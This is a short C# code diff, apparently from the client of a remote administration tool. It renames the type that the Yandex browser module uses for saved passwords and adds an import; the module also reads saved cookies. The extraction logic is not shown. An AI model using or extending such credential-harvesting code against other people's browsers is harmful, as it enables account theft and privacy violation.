@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.IO;
+using xClient.Core.Data;
 using xClient.Core.Recovery.Utilities;
 using xClient.Core.Utilities;
 
@@ -8,7 +9,7 @@ namespace xClient.Core.Recovery.Browsers
 {
     public class Yandex
     {
-        public static List<LoginInfo> GetSavedPasswords()
+        public static List<RecoveredAccount> GetSavedPasswords()
         {
             try
             {
@@ -18,7 +19,7 @@ namespace xClient.Core.Recovery.Browsers
             }
             catch (Exception)
             {
-                return new List<LoginInfo>();
+                return new List<RecoveredAccount>();
             }
         }
         public static List<ChromiumBase.ChromiumCookie> GetSavedCookies()
